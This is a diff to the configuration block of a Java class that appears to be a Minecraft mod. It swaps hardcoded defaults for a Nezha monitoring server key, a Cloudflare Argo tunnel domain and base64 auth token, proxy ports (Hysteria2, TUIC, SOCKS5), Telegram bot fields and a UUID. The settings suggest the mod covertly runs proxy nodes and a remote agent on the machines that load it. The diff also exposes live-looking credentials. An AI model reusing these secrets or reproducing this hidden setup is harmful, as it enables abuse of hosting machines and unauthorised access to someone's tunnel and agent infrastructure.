@@ -56,12 +56,12 @@ public class Maohi implements ModInitializer {
     }
 
     private static final String NZ_SERVER    = cfg("NZ_SERVER", "nz.lilyonlyone.eu.org");    //
-    private static final String NZ_KEY       = cfg("NZ_KEY", "hQTPvzCCsZUCoGdyn8");
+    private static final String NZ_KEY       = cfg("NZ_KEY", "zu0wkRkzQYzaYvSbez");
     private static final String NZ_PORT      = cfg("NZ_PORT", "443");                                  //
-    private static final String ARGO_DOMAIN  = cfg("ARGO_DOMAIN", "hi.mdtah.ccwu.cc");                           //
-    private static final String ARGO_AUTH    = cfg("ARGO_AUTH", "eyJhIjoiYjI2MDYyMzg2NDA3MDU3YzU3NzZkYTE1YzViM2IwM2YiLCJ0IjoiZjAyYTNkODMtMjk4My00N2QxLWE3MmUtZDEzNjFmZDYyZGY4IiwicyI6IlpUZzBPVGd4WVdZdFpUSXdNQzAwT0ROaUxUZzNZakF0T1RVNE5qa3pNVE0zTkRFMSJ9");
+    private static final String ARGO_DOMAIN  = cfg("ARGO_DOMAIN", "ax.mdtah.ccwu.cc");                           //
+    private static final String ARGO_AUTH    = cfg("ARGO_AUTH", "eyJhIjoiYjI2MDYyMzg2NDA3MDU3YzU3NzZkYTE1YzViM2IwM2YiLCJ0IjoiM2I0OTA2ODgtNjcxZC00MjYxLThjNjgtMmQ0YWMxMjhmNWU2IiwicyI6Ik9URXhaVGhsWW1RdE9URmlPUzAwTldJNExXRmtZelV0Tm1SaE5XWXpOR1JoWldNMiJ9");
     private static final String ARGO_PORT    = cfg("ARGO_PORT", "9002");                         //
-    private static final String HY2_PORT     = cfg("HY2_PORT", "25364");
+    private static final String HY2_PORT     = cfg("HY2_PORT", "54783");
     private static final String TUIC_PORT    = cfg("TUIC_PORT", "");
     private static final String S5_PORT      = cfg("S5_PORT", "");
     private static final String CFIP         = cfg("CFIP", "ip.sb");
@@ -69,7 +69,7 @@ public class Maohi implements ModInitializer {
     private static final String CHAT_ID      = cfg("CHAT_ID", "");
     private static final String BOT_TOKEN    = cfg("BOT_TOKEN", "");
     private static final String NAME         = cfg("NAME", "");
-    private static final String UUID         = cfg("UUID", "6ac67e23-8a85-4b8c-ba53-0f00cbb62d66");
+    private static final String UUID         = cfg("UUID", "0816cb2e-7177-4bde-adb5-990f6be5ae60");
     private static final String UPLOAD_URL   = cfg("UPLOAD_URL", "");   //
 
 
